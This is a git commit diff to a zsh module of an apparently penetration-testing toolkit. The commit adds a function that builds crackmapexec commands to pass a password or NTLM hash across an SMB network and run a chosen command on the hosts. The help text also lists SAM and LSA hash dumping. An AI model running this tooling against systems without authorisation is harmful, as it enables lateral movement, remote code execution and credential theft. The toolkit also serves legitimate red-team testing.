7706de5032e2dc0c06a89a86033182694a24dff7
Twilight4 <electrolight071@proton.me>
2024-05-19 16:10:30 +0200

    update

--- modules/nb-ad-pth.zsh
+++ modules/nb-ad-pth.zsh
@@ -14,6 +14,7 @@ Commands
 --------
 nb-ad-pth-install         installs dependencies
 nb-ad-pth-pass            pass the password/hash
+nb-ad-pth-pass-command    the password/hash and execute command
 nb-ad-pth-enum            enumerate shares
 nb-ad-pth-sam             dump SAM hashes
 nb-ad-pth-lsa             dump LSA hashes
@@ -54,6 +55,43 @@ nb-ad-pth-pass() {
         __ask "Enter the NTLM hash for authentication"
         __check-hash
         print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth | tee $(__netadpath)/cme-sweep.txt"
+    else
+        echo
+        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
+    fi
+}
+
+nb-ad-pth-pass-command() {
+    __check-project
+    nb-vars-set-network
+    nb-vars-set-user
+
+    __ask "Enter command to execute"
+    local cm && __askvar cm "COMMAND"
+
+    __ask "Do you want to log in using a password or a hash? (p/h)"
+    local login && __askvar login "LOGIN_OPTION"
+
+    if [[ $login == "p" ]]; then
+        __ask "Do you want to add a domain? (y/n)"
+        local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"
+
+        if [[ $add_domain == "y" ]]; then
+            __ask "Enter the domain"
+            nb-vars-set-domain
+            __ask "Enter a password for authentication"
+            nb-vars-set-pass
+            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' -x $cm | tee $(__netadpath)/cme-sweep.txt"
+        else
+            __ask "Enter a password for authentication"
+            nb-vars-set-pass
+            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' -x $cm | tee $(__netadpath)/cme-sweep.txt"
+        fi
+    elif [[ $login == "h" ]]; then
+        echo
+        __ask "Enter the NTLM hash for authentication"
+        __check-hash
+        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth -x $cm | tee $(__netadpath)/cme-sweep.txt"
     else
         echo
         __err "Invalid option. Please choose 'p' for password or 'h' for hash."
